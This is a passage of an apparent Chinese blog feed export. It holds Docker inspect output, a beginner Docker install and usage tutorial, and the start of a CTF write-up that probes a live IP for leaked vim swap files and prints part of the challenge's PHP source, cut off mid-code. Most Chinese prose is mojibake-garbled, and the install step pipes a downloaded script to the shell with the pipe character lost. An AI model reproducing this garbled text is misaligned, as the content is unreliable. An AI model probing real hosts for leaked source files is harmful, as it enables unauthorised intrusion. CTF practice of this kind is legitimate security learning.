&quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539-init/diff:/var/lib/docker/overlay2/b10716ca735ef9763f741ad0beb59aed4e7c7859bb4fecff04d8df91d84b22d6/diff:/var/lib/docker/overlay2/ff54443de624d248e7c25d4418ad0b31f4d00313ff8a6f5a5bd03d3477f666d2/diff:/var/lib/docker/overlay2/3dfaea4a76ba9e41e0f7f02859e31b7997ccb4b020e843e626283a405d286d19/diff:/var/lib/docker/overlay2/80098f33e92c084bd0d2145f7ee6a538dd5a8452b84e33418c05e0f47b3ce6b7/diff:/var/lib/docker/overlay2/0ca15e9df32499884ac3a1508ee6f854baaa832ba38dd67dda99caf8a354122b/diff:/var/lib/docker/overlay2/3fc01c213b12be2701b8e5c876742ca08fbf3f28c0729253216f86cd72dcf05d/diff:/var/lib/docker/overlay2/8ae1b6be565d46876f4cd1ea83ee22210e88d3331588f5e8c0e368de4a453091/diff:/var/lib/docker/overlay2/e6f44ca033c4fe66c3d51ad52cf1cbaff727f6809fa97a13323065056b9fd26c/diff:/var/lib/docker/overlay2/f23602b28997b720d79fd26fa4726d75f0bf396b0ccc22b95ae1cdc56a2d3191/diff:/var/lib/docker/overlay2/3222e61d544a81a68b93dfbbbe84fb97d180d1df827b90d1352a895b51729f55/diff:/var/lib/docker/overlay2/13cddf08b673042298865b2daac520b9d63806ce045b977af176694cfe703593/diff:/var/lib/docker/overlay2/ad5eefb4e45d4b347cac3475e64ffcd63ab7a3aa42fde14115e38c5467c91d9f/diff:/var/lib/docker/overlay2/405f4f83e271e45edb3f0df3476e4eb433d213adeb64ea71e2f4b1a820ec8d43/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/f7d660148c54b02dbdf3984f960d214707d939d7668e5df0c0954dda98273539/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;af7264cd0a97&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: false,</span><br><span class="line">            &quot;AttachStdout&quot;: false,</span><br><span class="line">            &quot;AttachStderr&quot;: false,</span><br><span class="line">            &quot;ExposedPorts&quot;: &#123;</span><br><span class="line">                &quot;5000/tcp&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Tty&quot;: false,</span><br><span class="line">            &quot;OpenStdin&quot;: false,</span><br><span class="line">            &quot;StdinOnce&quot;: false,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;python&quot;,</span><br><span class="line">                &quot;app.py&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;training/webapp&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;/opt/webapp&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;07146affbe8795cdade88d6ce45407d3aa77d2a3db946390a89a12eddf4f2281&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;</span><br><span class="line">                &quot;5000/tcp&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;HostIp&quot;: &quot;0.0.0.0&quot;,</span><br><span class="line">                        &quot;HostPort&quot;: &quot;5000&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/07146affbe87&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;f95361cc2fec09e16108de8c1818e659e5a67a0e7ee1f810f5425f48b3ba2311&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;f4c8148425eecef64502c5c3292494d640bb0670219d160f4bcd9edd7217af4b&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;f95361cc2fec09e16108de8c1818e659e5a67a0e7ee1f810f5425f48b3ba2311&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¼šè¿”å›ä¸€ä¸ªjson,jsoné‡Œé¢æ˜¯dockerå®¹å™¨çš„é…ç½®</p><h3 id="å¯¹å®¹å™¨çš„ä¸€äº›æ“ä½œ">å¯¹å®¹å™¨çš„ä¸€äº›æ“ä½œ</h3><p>docker stop xxx:åœæ­¢å®¹å™¨ docker start xxx:å¯åŠ¨å®¹å™¨ docker restart xxx:é‡å¯å®¹å™¨ docker rm xxx:ç§»é™¤å®¹å™¨ ok,å¯¹å®¹å™¨çš„å¤„ç†å°±åˆ°è¿™é‡Œäº†,è¾¹å­¦è¾¹å°è¯•å§</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockeræ–°æ‰‹å…¥é—¨(1)ä¹‹hello world</title>
      <link href="/2018/01/26/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8Bhello-world/"/>
      <url>/2018/01/26/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8Bhello-world/</url>
      
        <content type="html"><![CDATA[<p>è¿˜è®°å¾—ä¹‹å‰kyrioså¤§å¤§è¯´è¿‡å·¥ä½œå®¤æ‹›æ–°çš„æ—¶å€™dockeré‚£é¢˜æ²¡å†™çš„å¯’å‡å¾—è‡ªå­¦ä¸€ä¸‹docker.....çªç„¶æƒ³èµ·æ¥è¿™ä»¶äº‹,äºæ˜¯ç®€å•åœ°è‡ªå­¦ä¸€ä¸‹docker... æ•™ç¨‹å‚è€ƒ:http://www.runoob.com/docker/docker-tutorial.html è¿™é‡Œä»…ä»…å¯¹äºä¸ªäººçš„å­¦ä¹ åšä¸€ä¸ªè®°å½•,è§‰å¾—ç®€å•çš„è¯è‡ªå·±å»çœ‹æ•™ç¨‹å°±å¥½</p><h5 id="docker-æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“åŸºäº-go-è¯­è¨€-å¹¶éµä»apache2.0åè®®å¼€æº">Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€ å¹¶éµä»Apache2.0åè®®å¼€æºã€‚</h5><h5 id="docker-å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§å¯ç§»æ¤çš„å®¹å™¨ä¸­ç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„-linux-æœºå™¨ä¸Šä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–">Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚</h5><h5 id="å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ç±»ä¼¼-iphone-çš„-appæ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½">å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼ˆç±»ä¼¼ iPhone çš„ appï¼‰,æ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚</h5><p>æ•™ç¨‹å¼€å§‹ç»™å‡ºè¿™ä¹ˆä¸€æ®µè¯,å…ˆæ”¾ç€å§,ç­‰æ…¢æ…¢è§è¯†dockerçš„åŠŸèƒ½ä»¥åç›¸ä¿¡åŸç†åº”è¯¥ä¹Ÿæ›´å¥½ç†è§£å§...</p><h3 id="dockerçš„å®‰è£…">dockerçš„å®‰è£…</h3><h5 id="ç‰ˆæœ¬é—®é¢˜">ç‰ˆæœ¬é—®é¢˜</h5><p>æˆ‘æ˜¯ç”¨çš„ubuntuè£…çš„,dockerè¦æ±‚ubuntuå†…æ ¸ç‰ˆæœ¬é«˜äº3.10,å¯ä»¥é€šè¿‡uname -ræ¥æŸ¥çœ‹å½“å‰çš„å†…æ ¸ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@blacsheep-myubuntu:~$ uname -r</span><br><span class="line">4.10.0-37-generic</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨è„šæœ¬å®‰è£…">ä½¿ç”¨è„šæœ¬å®‰è£…</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@blacsheep-myubuntu:~$ sudo su</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# wget -qO- https://get.docker.com/  sh</span><br><span class="line"># Executing docker install script, commit: 1d31602</span><br><span class="line">+ sh -c apt-get update -qq &amp;gt;/dev/null</span><br><span class="line">+ sh -c apt-get install -y -qq apt-transport-https ca-certificates curl &amp;gt;/dev/null</span><br><span class="line">+ sh -c curl -fsSL &quot;https://download.docker.com/linux/ubuntu/gpg&quot;  apt-key add -qq - &amp;gt;/dev/null</span><br><span class="line">+ sh -c echo &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial edge&quot; &amp;gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line">+ [ ubuntu = debian ]</span><br><span class="line">+ sh -c apt-get update -qq &amp;gt;/dev/null</span><br><span class="line">+ sh -c apt-get install -y -qq --no-install-recommends docker-ce &amp;gt;/dev/null</span><br><span class="line">+ sh -c docker version</span><br><span class="line">Client:</span><br><span class="line"> Version:   18.01.0-ce</span><br><span class="line"> API version:   1.35</span><br><span class="line"> Go version:    go1.9.2</span><br><span class="line"> Git commit:    03596f5</span><br><span class="line"> Built: Wed Jan 10 20:11:05 2018</span><br><span class="line"> OS/Arch:   linux/amd64</span><br><span class="line"> Experimental:  false</span><br><span class="line"> Orchestrator:  swarm</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Engine:</span><br><span class="line">  Version:  18.01.0-ce</span><br><span class="line">  API version:  1.35 (minimum version 1.12)</span><br><span class="line">  Go version:   go1.9.2</span><br><span class="line">  Git commit:   03596f5</span><br><span class="line">  Built:    Wed Jan 10 20:09:37 2018</span><br><span class="line">  OS/Arch:  linux/amd64</span><br><span class="line">  Experimental: false</span><br><span class="line">If you would like to use Docker as a non-root user, you should now consider</span><br><span class="line">adding your user to the &quot;docker&quot; group with something like:</span><br><span class="line"></span><br><span class="line">  sudo usermod -aG docker your-user</span><br><span class="line"></span><br><span class="line">Remember that you will have to log out and back in for this to take effect!</span><br><span class="line"></span><br><span class="line">WARNING: Adding a user to the &quot;docker&quot; group will grant the ability to run</span><br><span class="line">         containers which can be used to obtain root privileges on the</span><br><span class="line">         docker host.</span><br><span class="line">         Refer to https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface</span><br><span class="line">         for more information.</span><br></pre></td></tr></table></figure><p>è£…å¥½åæœ‰æç¤º,å¦‚æœè¦ç”¨érootç”¨æˆ·ç›´æ¥è¿è¡Œdockeræ—¶,éœ€è¦æ‰§è¡Œsudo usermod -aG docker blacsheep,ç„¶åé‡æ–°ç™»å½•,å¦åˆ™ä¼šæœ‰é—®é¢˜,ç„¶åæˆ‘ä»¬åå°å¯åŠ¨ä¸€ä¸‹docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# service docker start</span><br></pre></td></tr></table></figure><p>è‡³äºé•œåƒåŠ é€Ÿæˆ‘æ˜¯ç›´æ¥æŒ‰æ•™ç¨‹é‡Œé¢æ¥å¼„çš„...åœ¨/etc/docker/daemon.jsoné‡Œé¢å†™ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®‰è£…å°±è‡³æ­¤ç»“æŸ..</p><h3 id="dockerçš„ä½¿ç”¨">dockerçš„ä½¿ç”¨</h3><h5 id="hello-world">hello world</h5><p>æ„Ÿè§‰ä¸€ä¸ªæ —å­å°±è®©æˆ‘æ„è¯†åˆ°äº†dockerçš„ä½œç”¨.... æ•™ç¨‹å¼€å§‹ä¸€å¥è¯:Docker å…è®¸ä½ åœ¨å®¹å™¨å†…è¿è¡Œåº”ç”¨ç¨‹åºï¼Œ ä½¿ç”¨ docker run å‘½ä»¤æ¥åœ¨å®¹å™¨å†…è¿è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚ è¾“å‡ºhello world</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker run ubuntu:16.10 /bin/echo &quot;hello world&quot;</span><br><span class="line">Unable to find image &#x27;ubuntu:16.10&#x27; locally</span><br><span class="line">16.10: Pulling from library/ubuntu</span><br><span class="line">dca7be20e546: Pull complete </span><br><span class="line">40bca54f5968: Pull complete </span><br><span class="line">61464f23390e: Pull complete </span><br><span class="line">d99f0bcd5dc8: Pull complete </span><br><span class="line">120db6f90955: Pull complete </span><br><span class="line">Digest: sha256:9e39bf1a0bf29dd1bf28211e3b870134d080b5d2b6072b47c5970d13e5725fb6</span><br><span class="line">Status: Downloaded newer image for ubuntu:16.10</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>å‚æ•°è§£æ: - docker:dockerçš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œ - run:ä¸å‰é¢çš„dockerç»„åˆæ¥è¿è¡Œä¸€ä¸ªå®¹å™¨ - ubuntu:16.10:dockeré¦–å…ˆæœ¬åœ°æŸ¥æ‰¾é•œåƒæ˜¯å¦å­˜åœ¨,å¦‚æœä¸å­˜åœ¨dockerå°±ä¼šä»é•œåƒä»“åº“docker hubé‡Œé¢ä¸‹è½½å…¬å…±é•œåƒ - /bin/echo "hello world":åœ¨å¯åŠ¨çš„å®¹å™¨é‡Œé¢æ‰§è¡Œçš„å‘½ä»¤ å®Œæ•´çš„æ„æ€å°±æ˜¯dockerä»¥ubuntu16.10é•œåƒåˆ›å»ºä¸€ä¸ªå®¹å™¨,å®¹å™¨é‡Œé¢è¿è¡Œbin/echo "hello world",ç„¶åè¾“å‡ºç»“æœ</p><h5 id="è¿è¡Œäº¤äº’å¼å®¹å™¨">è¿è¡Œäº¤äº’å¼å®¹å™¨</h5><p>é€šè¿‡è¿è¡Œdockerçš„ä¸¤ä¸ªå‚æ•°å¯ä»¥å®ç°å’Œdockerå®¹å™¨çš„äº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker run -i -t ubuntu:16.10 /bin/bash</span><br><span class="line">root@34541a7cf8a3:/# </span><br></pre></td></tr></table></figure><p>å‚æ•°è§£æ: - -t:åœ¨å®¹å™¨é‡ŒæŒ‡å®šä¸€ä¸ªç»ˆç«¯æˆ–ä¼ªç»ˆç«¯ - -i:å…è®¸ä½ å¯¹å®¹å™¨å†…çš„æ ‡å‡†è¾“å…¥è¿›è¡Œäº¤äº’ å°±åƒä¸Šé¢é‚£ä¸ª,æˆ‘ä»¬å°±è¿›å…¥äº†ä¸€ä¸ªæ–°çš„ubuntu16.10çš„å®¹å™¨,å¯ä»¥lsæ¥æŸ¥çœ‹æ–°çš„ç³»ç»Ÿçš„ç›®å½•,cat /proc/versionæ¥çœ‹ç³»ç»Ÿçš„ç‰ˆæœ¬,ç„¶åé€€å‡ºçš„è¯å¯ä»¥ç”¨exitæˆ–è€…ctrl+d</p><h5 id="åå°æ¨¡å¼">åå°æ¨¡å¼</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker run -d ubuntu:16.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">a1ccf7c2927e7032498e1b7ba3a172b0110ced4b0418f10c3e156d0d235627f1</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹-då‚æ•°,-dæ˜¯è¡¨ç¤ºåå°è¿è¡Œå®¹å™¨,åŒæ—¶è¿”å›å®¹å™¨id è¿™é‡Œæ‰§è¡Œå®Œäº†æ²¡æœ‰hello worldæ˜¾ç¤º,ä½†æ˜¯æˆ‘ä»¬è¿è¡Œdocker ps</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES</span><br><span class="line">a1ccf7c2927e        ubuntu:16.10        &quot;/bin/sh -c &#x27;while tâ€¦&quot;   About a minute ago   Up About a minute                       agitated_northcutt</span><br></pre></td></tr></table></figure><p>ç„¶ådocker logs a1ccf7c2927e æ¥æŸ¥çœ‹ <img src="/images/2018/01/docker-1.png" alt="blacsheep" /> å‘ç°å…¶å®å®¹å™¨æ˜¯åœ¨åå°è¿è¡Œçš„</p><h5 id="åœæ­¢å®¹å™¨">åœæ­¢å®¹å™¨</h5><p>ä¸ºäº†åœæ­¢æˆ‘ä»¬åˆšåˆšçš„å‘½ä»¤,æˆ‘ä»¬è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/etc/docker# docker stop a1ccf7c2927e7032498e1b7ba3a172b0110ced4b0418f10c3e156d0d235627f1 </span><br><span class="line">a1ccf7c2927e7032498e1b7ba3a172b0110ced4b0418f10c3e156d0d235627f1</span><br><span class="line">root@blacsheep-myubuntu:/etc/docker# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">root@blacsheep-myubuntu:/etc/docker# </span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„docker psè¯æ˜å·²ç»æˆåŠŸåœæ­¢äº†åå°è¿›ç¨‹.</p><h3 id="å°ç»“">å°ç»“</h3><p>è¿™é‡Œå‘è§‰dockerå¯ä»¥åœ¨ä¸€ä¸ªæ–°çš„å®¹å™¨é‡Œé¢å®Œæˆå„ç§éœ€è¦çš„æ“ä½œ,å¯¹äºç¯å¢ƒçš„é…ç½®ä¼šç®€å•å¾ˆå¤šå¾ˆå¤šã€‚è¿™æ˜¯æˆ‘ä¸ªäººç›®å‰çš„ç†è§£å§,è¿™é‡Œä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹dockerçš„æ“ä½œ,æ¯”è¾ƒç®€å•,åç»­å†æ…¢æ…¢æ·±å…¥å­¦ä¹ å§....</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>èµ›åšåœ°çƒæ¯(ä¸ä¼šéƒ¨åˆ†</title>
      <link href="/2018/01/25/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E4%B8%8D%E4%BC%9A%E9%83%A8%E5%88%86/"/>
      <url>/2018/01/25/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E4%B8%8D%E4%BC%9A%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h4 id="å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿå®¢æœä¸­å¿ƒæœŸå¾…æ‚¨çš„åé¦ˆ">å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿå®¢æœä¸­å¿ƒæœŸå¾…æ‚¨çš„åé¦ˆ</h4><h5 id="å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿå®¢æœä¸­å¿ƒå­˜åœ¨æ¼æ´flagå°±åœ¨flagflagflagflagflagflagflag.phpæ–‡ä»¶é‡Œé¢-http47.104.188.22620001-è¯·æ‰¾åˆ°è¿™ä¸ªéšè—çš„æ–‡ä»¶swpä¸ä¸ä¸å†æ‰¾æ‰¾">å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿå®¢æœä¸­å¿ƒå­˜åœ¨æ¼æ´ï¼Œflagå°±åœ¨flag/flag/flag/flag/flag/flag/flag.phpæ–‡ä»¶é‡Œé¢ http://47.104.188.226:20001 è¯·æ‰¾åˆ°è¿™ä¸ªéšè—çš„æ–‡ä»¶ï¼Œswpï¼Ÿä¸ä¸ä¸ã€‚ã€‚ã€‚å†æ‰¾æ‰¾ã€‚ã€‚</h5><p>æºç æ³„æ¼,ä»¥åæ‹¿åˆ°é¢˜ç›®æ²¡æ€è·¯å…ˆæŠŠå¯èƒ½æ³„æ¼æºç çš„åœ°æ–¹è¯•ä¸€éå†è¯´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.104.188.226:20001/.index.php.swp</span></span><br><span class="line">http:<span class="comment">//47.104.188.226:20001/.index.php.swo</span></span><br><span class="line">http:<span class="comment">//47.104.188.226:20001/.index.php.swn</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯æºç æ³„æ¼,ç„¶åæ‹¿åˆ°indexçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span>(<span class="params"><span class="variable">$page</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;flag&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no flag flag flag flag !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&#x27;uploaded&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;no uploaded uploaded uploaded uploaded !&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> 